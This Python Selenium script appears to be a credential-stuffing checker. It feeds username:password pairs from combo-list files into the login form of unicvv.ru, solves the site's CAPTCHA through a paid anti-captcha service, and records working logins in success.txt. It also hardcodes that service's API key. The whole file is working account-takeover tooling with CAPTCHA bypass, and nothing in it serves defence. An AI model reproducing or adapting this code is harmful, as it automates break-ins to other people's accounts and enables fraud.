
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from python_anticaptcha import AnticaptchaClient, ImageToTextTask
from selenium.webdriver.support.ui import WebDriverWait
import time
from PIL import Image
import sys

from io import BytesIO
import string
import base64
import random

chrome_driver = "chromedriver.exe"

api_key = '3ba305baf09547c8306b29374779e0aa'

WebSite_Url = 'https://unicvv.ru/'


txt_files = ["UNICCUP7.txt","UNICCUP10.txt","UNICCUP4.txt","UNICCUP5.txt","UNICCUP6.txt","UNICCUP9.txt"]


def generate_random_string(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

remaining_txt_file = 'failed_to_confirm_' + generate_random_string() + '.txt'



def get_and_save_captcha(img_file_name,Captcha_location):
    loc  = Captcha_location.location
    size = Captcha_location.size
    left  = loc['x']
    top   = loc['y']
    width = size['width']
    height = size['height']
    box = (int(left), int(top), int(left+width), int(top+height))

    screenshot = browser.get_screenshot_as_base64()

    img1 = Image.open(BytesIO(base64.b64decode(screenshot)))

    cropped_image = img1.crop(box)

    cropped_image.save(img_file_name, 'PNG')


def solve_captcha(img_file_path):
    captcha_fp = open(img_file_path, 'rb')
    client = AnticaptchaClient(api_key)
    task = ImageToTextTask(captcha_fp)
    job = client.createTask(task)
    job.join()
    print("Captcha Results Arrvied!")

    Captcha_text = job.get_captcha_text()
    return Captcha_text

# Using readline() 

count = 0
striped_line = None

try:
    for text in txt_files:
        file1 = open(text, 'r')
        print("Using Text File Named: " + text)

        # Get next line from file 
        alllines = file1.readlines() 

        for line in alllines:
            count = count + 1
            striped_line = line.strip()

            print("Current line: " + striped_line)

            Splitted_Line = striped_line.split(":")

            if len(Splitted_Line[0]) <= 6:
                print("username : " + Splitted_Line[0] +" is less than 6 CHARACTERS, skipping...")
                alllines.remove(line)
                continue

            if len(Splitted_Line[1]) <= 8:
                print("password : " + Splitted_Line[1] +" is less than 8 CHARACTERS, skipping...")
                alllines.remove(line)
                continue

            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument("--incognito")
            browser = webdriver.Chrome(chrome_driver,chrome_options=chrome_options)

            #browser.execute_script('localStorage.clear();')
            browser.get(WebSite_Url)
            username = browser.find_element_by_id("LoginForm_username")
            password = browser.find_element_by_id("LoginForm_password")

            username.send_keys(Splitted_Line[0])
            password.send_keys(Splitted_Line[1])

            elem = browser.find_element_by_id("yw0")

            print("Checking If Captcha image is Downloaded....")

            while True:
                #print(browser.execute_script("return arguments[0].complete && typeof arguments[0].naturalWidth != \"undefined\" && arguments[0].naturalWidth > 0",elem))
                if browser.execute_script("return arguments[0].complete && typeof arguments[0].naturalWidth != \"undefined\" && arguments[0].naturalWidth > 0",elem):
                    break
                else:
                    print("Captcha image is not Downloaded yet!")

                time.sleep(1)


            print("Webpage loaded completly...")
                
            print("Extracting Captcha image...")

            print("Downloading Captcha image...")
            get_and_save_captcha("Captcha.png",elem)

            print("Captcha image Downloaded!")


            print("Sending Captcha To Solve...")

            cap_txt = solve_captcha("Captcha.png")

            print("Captcha_text : " + cap_txt)

            Captcha_field = browser.find_element_by_id("LoginForm_captcha")

            Captcha_field.send_keys(cap_txt)
            browser.find_element_by_css_selector("#login-form > div > div.loginform > div.inputslogin > button").click()

            time.sleep(2)

            element = browser.find_elements_by_xpath("//*[contains(text(), 'Incorrect username or password.')]")
            captcha_err_message = browser.find_elements_by_xpath("//*[contains(text(), 'The verification code is incorrect.')]")

            print(element)
            print(len(element))

            print(captcha_err_message)
            print(len(captcha_err_message))
            if len(element) > 0:
                print("incorrect username or password!")
            

            #captcha_err_message = browser.find_element_by_id("LoginForm_captcha_em_")
            elif len(captcha_err_message) > 0:
                print("Incorrect Captcha!")
                print("SAVING IN "+remaining_txt_file+" FILE..")
                
                file123 = open(remaining_txt_file, 'a') 
                file123.write(line + "\n") 
                file123.close()

            else:
                file12 = open('success.txt', 'a') 
                file12.write(line) 
                file12.close()
                

            # Writing to a file
            alllines.remove(line)
            browser.quit()

except Exception as e:
    #browser.quit()
    saving_txt_file = 'remaining_accounts_'+ generate_random_string() +'.txt'
    file12 = open(saving_txt_file, 'a')
    for lin3 in alllines:
        lin3 = lin3.strip()
        file12.write(lin3)

    file12.close()
    file1.close() 
    raise e
    sys.exit(0)


saving_txt_file = 'remaining_accounts_'+ generate_random_string() +'.txt'
file12 = open(saving_txt_file, 'w')
for lin3 in alllines:
    lin3 = lin3.strip()
     
    file12.write(lin3) 
        

file12.close()
file1.close()